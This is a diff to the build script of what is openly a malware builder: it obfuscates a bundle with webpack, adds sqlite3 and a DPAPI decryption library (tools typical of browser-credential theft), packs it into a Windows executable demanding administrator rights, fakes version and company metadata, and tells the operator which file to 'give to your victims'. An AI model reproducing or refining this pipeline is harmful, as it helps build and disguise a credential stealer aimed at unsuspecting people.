@@ -1,4 +1,4 @@
-const { rmSync, existsSync, writeFileSync, readdirSync } = require('fs');
+const { rmSync, existsSync, writeFileSync, unlinkSync } = require('fs');
 const { join, extname, resolve } = require('path');
 const { execSync } = require('child_process');
 
@@ -9,10 +9,10 @@ if (!existsSync('node_modules')) {
   console.log('Installed npm modules\n');
 }
 
-const builder = require('electron-builder');
 const pngToIco = require('png-to-ico');
 const inquirer = require('inquirer');
 const config = require('./config.json');
+const rcedit = require('rcedit');
 let icon;
 
 console.log('========================================================');
@@ -188,57 +188,35 @@ console.log('');
     }
   }
 
+  if (existsSync(`${config.filename}.exe`)) unlinkSync(`${config.filename}.exe`);
+
   console.log('Minifying and obfuscating code... This can take some minutes, please be patient.');
   execSync('npx webpack', { stdio: 'pipe' });
   console.log('Done minifying and obfuscating.');
 
   execSync(`npm install sqlite3 electron @primno/dpapi --no-package-lock --no-interactive --prefix "${join(__dirname, 'dist')}"`, { stdio: 'pipe' });
 
-  function randomString(length) {
-    let result = '';
-    const characters = 'abcdefghijklmnopqrstuvwxyz';
-    const charactersLength = characters.length;
-    let counter = 0;
-    while (counter < length) {
-      result += characters.charAt(Math.floor(Math.random() * charactersLength));
-      counter += 1;
-    }
-    return result;
-  }
-
   console.log('Building electron executable...');
-  // Build the executable
-  builder.build({
-    targets: builder.Platform.WINDOWS.createTarget(),
-    config: {
-      appId: 'com.' + randomString(16),
-      productName: config.name,
-      executableName: config.filename,
+
+  new Promise((r) => r(execSync(`npx pkg dist/index.bundle.js -t node18-win-x64 -C GZip -o "${config.filename}.exe"`, { stdio: 'inherit' }))).then(async () => {
+    const version = `${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}`;
+    await rcedit(`${config.filename}.exe`, {
       icon,
-      compression: 'maximum',
-      buildVersion: `${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}`,
-      artifactName: config.filename + '.exe',
-      win: {
-        target: [{
-          target: 'portable',
-          arch: 'x64'
-        }]
-      },
-      portable: {
-        warningsAsErrors: false,
-        requestExecutionLevel: 'highest'
-      },
-      files: [
-        'dist/*.bundle.js',
-        'dist/node_modules',
-        '!node_modules'
-      ],
-      includeSubNodeModules: true
-    }
-  }).then(() => {
-    readdirSync(resolve('dist')).filter(f => !f.endsWith('.exe')).forEach(f => {
-      existsSync(resolve('dist', f)) && rmSync(resolve('dist', f), { recursive: true });
+      'requested-execution-level': 'requireAdministrator',
+      'file-version': version,
+      'product-version': version,
+      'version-string': {
+        OriginalFilename: '',
+        ProductName: `${config.name}`,
+        LegalCopyright: `Copyright © ${new Date().getFullYear()} ${config.name}`,
+        InternalFilename: `${config.filename}`,
+        CompanyName: `${config.name}`,
+        FileDescription: ''
+      }
     });
-    console.log(`Done! The file you'll need to give to your victims is ${resolve('dist', `${config.filename}.exe`)}`);
+
+    rmSync(resolve('dist'), { recursive: true, force: true });
+
+    console.log(`Done! The file you'll need to give to your victims is ${config.filename}.exe`);
   });
 })();
